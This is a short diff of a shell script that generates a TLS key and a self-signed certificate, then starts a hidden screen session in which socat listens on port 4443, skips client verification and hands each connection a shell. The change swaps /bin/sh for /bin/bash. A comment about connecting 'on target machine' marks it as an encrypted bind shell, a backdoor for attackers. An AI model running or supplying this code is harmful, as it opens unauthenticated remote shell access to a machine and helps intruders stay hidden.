@@ -8,7 +8,7 @@ openssl genrsa -out "$key_file" 4096 2>/dev/null
 # Generate a self-signed certificate, suppressing output
 openssl req -new -x509 -key "$key_file" -out "$cert_file" -days 365 -subj "/CN=localhost" 2>/dev/null
 # Start a socat shell in a new detached screen session
-screen -dmS socat_session socat OPENSSL-LISTEN:4443,cert="$cert_file",key="$key_file",verify=0,fork EXEC:"/bin/sh"
+screen -dmS socat_session socat OPENSSL-LISTEN:4443,cert="$cert_file",key="$key_file",verify=0,fork EXEC:"/bin/bash"
 
 
 # To connect on target machine:
